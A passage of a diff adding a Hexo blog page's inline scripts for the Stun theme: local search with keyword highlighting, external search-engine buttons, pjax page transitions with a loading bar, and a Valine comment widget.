+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
+    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
+    notify: true,
+    verify: true,
+    placeholder: '写点什么吧',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: true,
+    recordIP: true,
+    lang: 'zh-cn,en' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (true) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
